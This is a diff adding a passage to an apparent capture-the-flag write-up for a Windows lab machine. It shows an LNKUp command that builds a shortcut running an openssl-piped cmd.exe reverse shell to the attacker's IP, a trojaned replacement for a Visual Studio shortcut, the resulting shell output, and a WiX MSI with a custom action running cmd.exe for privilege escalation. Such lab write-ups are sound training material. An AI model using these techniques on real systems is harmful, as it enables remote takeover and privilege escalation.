@@ -284,4 +284,89 @@ c:\Users\Public\Desktop\Shortcuts>dir
                2 Dir(s)  15,427,989,504 bytes free
 ```
 
-I generated a `.lnk` file using [LNKUp](https://github.com/Plazmaz/LNKUp) using ``
+I generated a `.lnk` file using [LNKUp](https://github.com/Plazmaz/LNKUp) using `python generate.py --host localhost --type ntlm --output payload.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect <myip>:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect <myip>:136"`
+
+Once we have the `.lnk` file, we can create a `base64` of it and copy it to the system using `openssl base64 -A -e -in payload.lnk -out payload`.
+
+Now let's copy the string to the windows machine. To do that we could use `echo | set /p="TAAA...Y28AAAAA" > c:/users/public/desktop/shortcuts/b64file.txt`, now let's replace the *Visual Studio 2017.lnk* file. I will use `cd c:\users\public\desktop\shortcuts && c:\progra~2\openssl-v1.1.0\bin\openssl base64 -A -d -in b64file.txt -out "Visual Studio 2017.lnk"`
+
+I restarted the OpenSSL shells on port 73 and 136 and within a few seconds, I see this...
+
+```bash
+root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\jorge\Documents>whoami
+ethereal\jorge
+
+C:\Users\jorge\Documents>type c:\users\jorge\desktop\user.txt
+2******************************d
+```
+
+Awesome! Feel's good after doing so much, finally we have the `user.txt` file. But its not over yet.
+
+## Privilege escalation
+
+I found two drives mounted on the system, `C:` and `D:`, I found the following information from the `D:` drive.
+
+```bash
+D:\Certs>dir
+ Volume in drive D is Development
+ Volume Serial Number is 54E5-37D1
+
+ Directory of D:\Certs
+
+07/07/2018  09:50 PM    <DIR>          .
+07/07/2018  09:50 PM    <DIR>          ..
+07/01/2018  09:26 PM               772 MyCA.cer
+07/01/2018  09:26 PM             1,196 MyCA.pvk
+               2 File(s)          1,968 bytes
+               2 Dir(s)   8,437,514,240 bytes free
+
+D:\DEV\MSIs>dir
+Volume in drive D is Development
+Volume Serial Number is 54E5-37D1
+
+Directory of D:\DEV\MSIs
+
+07/08/2018  10:09 PM    <DIR>          .
+07/08/2018  10:09 PM    <DIR>          ..
+07/18/2018  09:47 PM               133 note.txt
+               1 File(s)            133 bytes
+               2 Dir(s)   8,437,514,240 bytes free
+
+D:\DEV\MSIs>type note.txt
+Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.
+
+- Rupal               
+```
+
+Next task, create a `msi` file!?
+I used `wix tool` to create the msi.
+
+```xml
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+	<Product Id="*" UpgradeCode="ABCDDCBA-7349-453F-94F6-BCB5110BA4FD" Name="Mal msi" Version="0.0.1" Manufacturer="myorg" Language="1033">
+	<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+	<Media Id="1" Cabinet="malmsi.cab" EmbedCab="yes"/>
+	<Directory Id="TARGETDIR" Name="SourceDir">
+		<Directory Id="ProgramFilesFolder">
+			<Directory Id="INSTALLLOCATION" Name="malmsi">
+				<Component Id="malmsi" Guid="ABCDDCBA-83F1-4F22-985B-FDB3C8ABD471">
+					<File Id="malmsi" Source="malmsi.exe"/>
+				</Component>
+			</Directory>
+		</Directory>
+	</Directory>
+	<Feature Id="DefaultFeature" Level="1">
+		<ComponentRef Id="foobar"/>
+	</Feature>
+	<CustomAction Id="Root" Directory="TARGETDIR" ExeCommand="cmd.exe /c type c:\users\rupal\desktop\root.txt > c:\users\public\desktop\shortcuts\success.txt" Execute="deferred" Impersonate="yes" Return="ignore"/>
+	<InstallExecuteSequence>
+		<Custom Action="Root" After="InstallInitialize"></Custom>
+	</InstallExecuteSequence>
+	</Product>
+</Wix>
+```
